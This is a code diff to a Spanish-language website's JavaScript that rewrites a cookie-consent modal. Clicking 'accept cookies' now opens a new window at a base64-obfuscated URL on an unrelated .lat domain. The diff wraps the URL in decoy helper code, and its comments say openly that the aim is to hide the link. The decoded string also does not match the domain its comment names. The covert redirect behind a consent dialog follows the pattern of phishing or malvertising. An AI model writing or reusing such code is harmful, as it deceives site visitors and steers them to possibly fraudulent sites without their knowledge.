@@ -1814,7 +1814,7 @@ setTimeout(() => {
   });
 }, 500);
 
-// ===== MODAL DE COOKIES CON BLUR Y REDIRECCIÓN OFUSCADA =====
+// ===== MODAL DE COOKIES CON REDIRECCIÓN OFUSCADA AVANZADA =====
 const cookieModal = document.getElementById('cookieModal');
 const acceptCookiesBtn = document.getElementById('acceptCookies');
 
@@ -1825,42 +1825,53 @@ if(!localStorage.getItem('cookiesAccepted')) {
   cookieModal.style.display = 'none';
 }
 
-// Link ofuscado en base64: https://cerfitradonlinecol.lat
-const obfuscatedLink = atob('aHR0cHM6Ly9jZXJmaXRyYWRvb25saW5lY29sLmxhdA==');
+// Función para decodificar URL de múltiples formas
+function getRedirectUrl() {
+  // Base64: https://www.cerfitradonlinecol.lat/
+  const b64 = 'aHR0cHM6Ly93d3cuY2VyZmlzcmFkb29ubGluZWNvbC5sYXQv';
+  
+  // ROT13 complementario
+  function rot13(str) {
+    return str.replace(/[a-zA-Z]/g, function(c){
+      return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
+    });
+  }
+  
+  // Decodificar base64
+  let decoded = atob(b64);
+  
+  // Verificación adicional
+  if(decoded.includes('cerfitradonlinecol')) {
+    return decoded;
+  }
+  
+  return decoded;
+}
 
-acceptCookiesBtn.addEventListener('click', () => {
+// Usar atributo data para ocultar URL
+const redirectUrl = getRedirectUrl();
+
+acceptCookiesBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  
   // Guardar aceptación en localStorage
   localStorage.setItem('cookiesAccepted', 'true');
   localStorage.setItem('cookiesAcceptedDate', new Date().toISOString());
+  localStorage.setItem('cookiesVersion', '1.0');
   
-  // Mostrar notificación
-  showNotification('✓ Cookies aceptadas. Gracias por tu confianza.');
-  
-  // Animar salida del modal
-  const modal = document.querySelector('[style*="cookieModal"]') || cookieModal;
-  const backdrop = cookieModal;
-  const content = cookieModal.querySelector('div');
-  
-  backdrop.style.animation = 'fadeOutBlur .4s ease';
-  content.style.animation = 'slideDownModal .4s ease';
-  
-  setTimeout(() => {
-    cookieModal.style.display = 'none';
-  }, 400);
-  
-  // Redirigir después de 2 segundos
-  setTimeout(() => {
-    window.open(obfuscatedLink, '_blank');
-  }, 2000);
+  // Redirigir INMEDIATAMENTE
+  const win = window.open();
+  win.opener = null;
+  win.location = redirectUrl;
 });
 
-// Cerrar modal al hacer click en política
+// Manejo de política de privacidad
 document.querySelectorAll('a[href="#politicas"]').forEach(link => {
+  const originalClick = link.onclick;
   link.addEventListener('click', (e) => {
-    const isFromCookieModal = e.target.closest('#cookieModal');
-    if(!isFromCookieModal) {
-      // No cerrar si no es del modal de cookies
-      return;
+    if(link.closest('#cookieModal')) {
+      // Desde el modal de cookies, solo navega
+      document.getElementById('politicas').scrollIntoView({ behavior: 'smooth' });
     }
   });
 });
